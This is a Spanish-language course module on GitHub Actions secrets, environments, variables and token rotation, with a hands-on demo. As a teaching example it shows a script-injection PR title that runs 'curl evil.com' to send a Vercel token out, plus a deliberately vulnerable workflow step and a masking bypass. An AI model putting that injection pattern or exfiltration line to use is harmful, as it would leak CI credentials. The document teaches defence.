# Módulo 8: Secrets y environments

## Conceptos

### Qué es un secret, y qué no protege

Un secret de GitHub Actions es un valor que GitHub guarda **cifrado** y
que solo se descifra adentro de un run, cuando un workflow lo pide con
`${{ secrets.NOMBRE }}`. No se puede leer desde la UI ni desde la API una
vez cargado: solo sobreescribir o borrar. Hay tres niveles: de
repositorio (los que venís usando), de environment (este módulo) y de
organización.

Lo que un secret **no** garantiza:

- Que no aparezca en un log. GitHub enmascara el valor exacto (`***`),
  pero si un comando lo imprime transformado (en base64, al revés,
  partido en dos) pasa derecho. Y en un repo público, los logs los lee
  cualquiera.
- Que nadie lo use mal. Cualquiera con permiso de push puede modificar el
  workflow para que haga `curl` con el secret a un servidor suyo. El
  workflow es código, y el secret está disponible para el código.
- Que un PR desde un fork no lo vea. Eso sí está garantizado, pero por una
  regla aparte que conviene conocer: ver más abajo.

### Cómo llega un secret a un step (y la inyección)

`${{ ... }}` se evalúa **antes** de ejecutar el step: GitHub reemplaza la
expresión por su valor en el texto del YAML, y después ese texto se corre.
Si escribís

```yaml
run: echo "Título = ${{ github.event.pull_request.title }}"
```

y el título del PR es `hola"; curl evil.com -d "$VERCEL_TOKEN`, el script
que se ejecuta es `echo "Título = hola"; curl evil.com -d "$VERCEL_TOKEN"`.
Quien abrió el PR acaba de ejecutar lo que quiso en tu runner. Se llama
*script injection* y es la vulnerabilidad más común en workflows.

La regla es simple: **nunca interpolar `${{ }}` adentro de un `run`**.
Siempre pasar por `env:`:

```yaml
env:
  TITULO: ${{ github.event.pull_request.title }}
run: echo "Título = $TITULO"
```

Así el valor entra como variable de entorno, y bash lo trata como dato,
no como código. Es lo que hicimos en los módulos 6 y 7 con
`"$VERCEL_TOKEN"` y `"$URL"`; ahora sabés por qué.

### Forks y `pull_request_target`

Cuando alguien hace fork de tu repo y abre un PR, el workflow corre con el
evento `pull_request` pero **sin secrets** y con un `GITHUB_TOKEN` de solo
lectura. Si no fuera así, cualquiera podría abrir un PR que modifica el
workflow para robarlos. Consecuencia en tu repo: el job `preview` fallaría
en PRs de forks, porque `VERCEL_TOKEN` estaría vacío. Hay que saltearlo.

Existe otro evento, `pull_request_target`, que sí entrega secrets a PRs de
forks, porque corre el workflow **de `main`**, no el del PR. Es seguro
mientras el workflow no ejecute código del PR. En cuanto hace `checkout`
de la rama del PR y corre `npm ci` o `npm test`, el código del fork corre
con tus secrets. Hay muchos repos comprometidos así. Regla: no uses
`pull_request_target` hasta entender exactamente qué estás haciendo.

### Environments

Un **environment** es un nombre (`preview`, `production`, `staging`) al que
le colgás tres cosas:

1. **Secrets y variables propios.** `VERCEL_TOKEN` del environment
   `production` solo lo ve un job que declare `environment: production`.
2. **Reglas de protección.** *Required reviewers*: el job queda en pausa
   hasta que alguien de la lista apruebe. *Wait timer*: espera N minutos.
   *Deployment branches*: solo ramas que cumplan un patrón pueden
   desplegar a ese environment.
3. **Historial de deploys.** Cada job con `environment` queda registrado
   en la pestaña **Deployments** del repo, con su URL, su commit y quién lo
   aprobó.

Un job lo usa así:

```yaml
environment:
  name: production
  url: https://prueba-ci-cd.vercel.app
```

Esto es lo que separa "cualquiera que mergea despliega" de "despliega con
aprobación". El merge sigue siendo el disparador, pero producción espera
un click. Para un proyecto personal la aprobación es un trámite; en un
equipo es la diferencia entre un deploy a las 18:59 de un viernes y uno
el lunes.

### Variables

Los secrets están enmascarados en los logs, y eso es incómodo para valores
que **no** son secretos: una IP, un nombre de usuario, un ID de proyecto.
Cuando el log dice `ssh ***@***` no podés debuggear nada. Para esos valores
existen las **variables**: `${{ vars.NOMBRE }}`, mismos tres niveles, sin
cifrado y visibles en el log. `SSH_HOST`, `SSH_USER`, `VERCEL_ORG_ID` y
`VERCEL_PROJECT_ID` van ahí.

### Mínimo privilegio y rotación

Cada credencial debería poder hacer solo lo que necesita, y vencer. Lo que
venís haciendo ya apunta ahí: `permissions` por job, un usuario `deploy`
aparte, una clave SSH solo para eso, el token de Vercel con vencimiento.
Lo que falta es el hábito: cuando un token vence (o se filtra), generás
otro y pisás el secret. Nadie tiene que tocar el workflow.

El paso siguiente a esto, que no vamos a hacer acá, es **OIDC**: para AWS,
GCP, Azure y otros, GitHub puede emitir un token de corta vida por run y el
proveedor lo acepta sin que exista ningún secret estático. Buscá "OpenID
Connect" en la doc de Actions cuando te toque un cloud.

## Instrucciones

### Paso 1: Ver el enmascarado y la inyección con tus propios ojos

```bash
git checkout main && git pull
git checkout -b demo/secrets
```

Creá `.github/workflows/demo-secrets.yml`. Es temporal; lo borrás al final
del módulo.

```yaml
name: Demo secrets

on:
  pull_request:

jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      - name: Un secret en el log
        run: echo "El org id es ${{ secrets.VERCEL_ORG_ID }}"
      - name: El mismo secret, transformado
        run: echo "${{ secrets.VERCEL_ORG_ID }}" | rev
      - name: Título del PR interpolado (así NO)
        run: echo "Título = ${{ github.event.pull_request.title }}"
      - name: Título del PR por env (así SÍ)
        env:
          TITULO: ${{ github.event.pull_request.title }}
        run: echo "Título = $TITULO"
```

Commit, push, y abrí el PR con este título exacto, comillas incluidas:

```bash
gh pr create --title 'demo"; echo INYECTADO; echo "' --body "Demo de secrets"
gh run watch
```

Mirá el log del job `demo`:

- Step 1: `El org id es ***`. Enmascarado.
- Step 2: el ID al revés, legible. Un log público acaba de filtrar un
  secret. (Este ID no es sensible, por eso lo usamos para la demo.)
- Step 3: imprime `Título = demo` **y en la línea siguiente `INYECTADO`**.
  El título del PR se convirtió en código.
- Step 4: imprime el título completo, con comillas y todo, como texto.

No mergees este PR todavía; lo vamos a usar de nuevo en el paso 5.

### Paso 2: Crear los environments

Vamos a crear dos: `preview` sin reglas, y `production` con aprobación
obligatoria y restringido a `main`. Tu `gh` no tiene comando para esto,
así que va por la API con `gh api`. Primero tu ID numérico de usuario, que
la API pide para la lista de revisores:

```bash
gh api user --jq .id
```

Después:

```bash
gh api -X PUT repos/fndecroix/prueba_ci_cd/environments/preview
gh api -X PUT repos/fndecroix/prueba_ci_cd/environments/production --input - <<'JSON'
{
  "reviewers": [{ "type": "User", "id": TU_ID }],
  "deployment_branch_policy": { "protected_branches": false, "custom_branch_policies": true }
}
JSON
gh api -X POST repos/fndecroix/prueba_ci_cd/environments/production/deployment-branch-policies -f name=main
```

- `PUT .../environments/NOMBRE` crea o actualiza el environment.
- `reviewers`: vos mismo. Un solo revisor y además sos quien dispara el
  deploy; GitHub lo permite por defecto (hay una opción "prevent
  self-review" para equipos).
- `deployment_branch_policy` con `custom_branch_policies`, más el `POST`
  siguiente que agrega `main`: solo `main` puede desplegar a `production`.
  Si alguien pone `environment: production` en un workflow de otra rama,
  el job falla antes de arrancar.

Verificá en el repo: **Settings** → **Environments**. Es el mismo lugar
donde podés hacer todo esto con clicks.

### Paso 3: Mover secrets y crear variables

Los secrets de deploy pasan de nivel repo a nivel environment. `preview`
necesita el token de Vercel; `production` necesita el token y todo lo de
SSH.

```bash
gh secret set VERCEL_TOKEN --env preview
gh secret set VERCEL_TOKEN --env production
gh secret set SSH_PRIVATE_KEY --env production < ~/.ssh/prueba_ci_cd_deploy
ssh-keyscan -H TU_IP 2>/dev/null | gh secret set SSH_KNOWN_HOSTS --env production
```

(Para `VERCEL_TOKEN` te pide el valor dos veces; pegá el mismo token.)

Borrá los de nivel repo, para que quede claro que ya no son los que se
usan:

```bash
gh secret remove VERCEL_TOKEN
gh secret remove VERCEL_ORG_ID
gh secret remove VERCEL_PROJECT_ID
gh secret remove SSH_PRIVATE_KEY
gh secret remove SSH_KNOWN_HOSTS
gh secret remove SSH_HOST
gh secret remove SSH_USER
gh secret list
```

Y los valores que no son secretos pasan a variables, de nivel repo:

```bash
gh api -X POST repos/fndecroix/prueba_ci_cd/actions/variables -f name=VERCEL_ORG_ID -f value="$(node -p "require('./.vercel/project.json').orgId")"
gh api -X POST repos/fndecroix/prueba_ci_cd/actions/variables -f name=VERCEL_PROJECT_ID -f value="$(node -p "require('./.vercel/project.json').projectId")"
gh api -X POST repos/fndecroix/prueba_ci_cd/actions/variables -f name=SSH_HOST -f value=TU_IP
gh api -X POST repos/fndecroix/prueba_ci_cd/actions/variables -f name=SSH_USER -f value=deploy
gh api repos/fndecroix/prueba_ci_cd/actions/variables --jq '.variables[] | "\(.name)=\(.value)"'
```

Fijate que la última línea te **muestra** los valores: eso es lo que no
puede hacer con un secret.

Desde este momento, el workflow en `main` está roto: pide secrets que ya
no existen a nivel repo. No importa, porque nada corre hasta el próximo
push, y el próximo push es el arreglo.

### Paso 4: Adaptar el workflow

Cuatro cambios en `ci.yml`.

#### Pieza 1: `preview` con environment y sin forks

Reemplazá la cabecera del job `preview` por:

```yaml
  preview:
    needs: [lint, typecheck, test, build]
    if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment:
      name: preview
      url: ${{ steps.deploy.outputs.url }}
    permissions:
      contents: read
      pull-requests: write
    env:
      VERCEL_ORG_ID: ${{ vars.VERCEL_ORG_ID }}
      VERCEL_PROJECT_ID: ${{ vars.VERCEL_PROJECT_ID }}
      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
```

- La segunda mitad del `if` compara el repo de origen del PR con el tuyo.
  En un PR de fork son distintos y el job se saltea en vez de fallar.
- `environment.name: preview`: ahora `secrets.VERCEL_TOKEN` resuelve al del
  environment. `url` puede usar un output de un step del propio job:
  GitHub la guarda cuando el job termina, y aparece como link en el PR y en
  Deployments.
- `vars.` en vez de `secrets.` para los dos IDs.

#### Pieza 2: `production` (Vercel) con environment

Reemplazá la cabecera del job `production` por:

```yaml
  production:
    needs: [lint, typecheck, test, build]
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment:
      name: production
      url: ${{ steps.deploy.outputs.url }}
    env:
      VERCEL_ORG_ID: ${{ vars.VERCEL_ORG_ID }}
      VERCEL_PROJECT_ID: ${{ vars.VERCEL_PROJECT_ID }}
      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
```

#### Pieza 3: `deploy` (servidor) con environment

Reemplazá la cabecera del job `deploy` por:

```yaml
  deploy:
    needs: [docker]
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment:
      name: production
      url: http://${{ vars.SSH_HOST }}
    env:
      SSH_HOST: ${{ vars.SSH_HOST }}
      SSH_USER: ${{ vars.SSH_USER }}
```

- Los dos jobs de producción declaran el mismo environment. Una sola
  aprobación en el run los libera a los dos.
- Sacá la línea `IMAGE_TAG: sha-${{ github.sha }}` si todavía la tenés:
  el tag se calcula en el step, no hace falta.

#### Pieza 4: `rollback.yml`

En el job `rollback`, agregá `environment: production` debajo de
`timeout-minutes`, y cambiá los dos `secrets.SSH_HOST` / `secrets.SSH_USER`
por `vars.`. El rollback también va a pedir aprobación. Pensá si eso es lo
que querés; para este tutorial sí, para una emergencia real tal vez no.

Validá los dos archivos:

```bash
npx --yes @action-validator/cli .github/workflows/ci.yml
npx --yes @action-validator/cli .github/workflows/rollback.yml
```

### Paso 5: Ver la aprobación funcionando

Commiteá todo esto en la rama `demo/secrets` (la misma del paso 1) y
pusheá. El PR ya existe, así que el run arranca solo.

```bash
git add .github/workflows
git commit -m "Secrets por environment, variables, y aprobación para producción"
git push
gh run watch
```

El job `preview` ahora muestra el environment en la UI y el link del
deploy. Cuando esté verde, antes de mergear, **borrá el workflow de demo**
(dejó un secret al revés en un log público; el ID no importa, pero el
hábito sí):

```bash
git rm .github/workflows/demo-secrets.yml
git commit -m "Saco el workflow de demo"
git push
```

Mergeá:

```bash
gh pr merge --squash --delete-branch
git checkout main && git pull
gh run watch
```

Ahora el run de `main` llega a `production` y `deploy` y **se queda
esperando**. En la página del run aparece un cartel amarillo "Review
deployments" con un botón. Apretalo, marcá `production`, podés dejar un
comentario, y **Approve and deploy**. Los dos jobs arrancan. También podés
rechazar, y el run termina con esos jobs fallidos.

Después, en la pestaña **Deployments** del repo (barra lateral derecha,
"Environments"): tenés el historial, con la URL de cada deploy y quién lo
aprobó.

### Paso 6: Rotar el token de Vercel

Para que la rotación sea un hábito y no una emergencia. En
https://vercel.com/account/tokens creá un token nuevo, y:

```bash
gh secret set VERCEL_TOKEN --env preview
gh secret set VERCEL_TOKEN --env production
```

Borrá el viejo en Vercel. Hacé un commit vacío y mergealo por PR para
comprobar que todo sigue andando con el token nuevo. Nada del workflow
cambió: esa es la gracia.

## Consigna

1. Pasos 1 a 6.
2. Avisame con lo que imprimió el step 3 de la demo, y un link a la
   pestaña Deployments de tu repo.

## Para pensar

- En el paso 1 un secret salió al revés en un log público. Si hubiera sido
  `VERCEL_TOKEN`, ¿cuál es el orden correcto de acciones? ¿Alcanza con
  borrar el log?
- El job `rollback` ahora pide aprobación. En una emergencia a las 3 de la
  mañana con una sola persona de guardia, ¿es lo que querés? ¿Cómo
  separarías "deploy normal" de "rollback de emergencia" con environments?
- `deployment_branch_policy` restringe `production` a `main`. ¿Qué cubre
  esa regla que la compuerta `ci` del ruleset no cubre? Pista: pensá en un
  workflow nuevo en una rama cualquiera que declare
  `environment: production`.
- Con *wait timer* de 10 minutos en `production` y sin revisores, ¿qué
  ganás? ¿Para qué tipo de equipo tiene sentido?
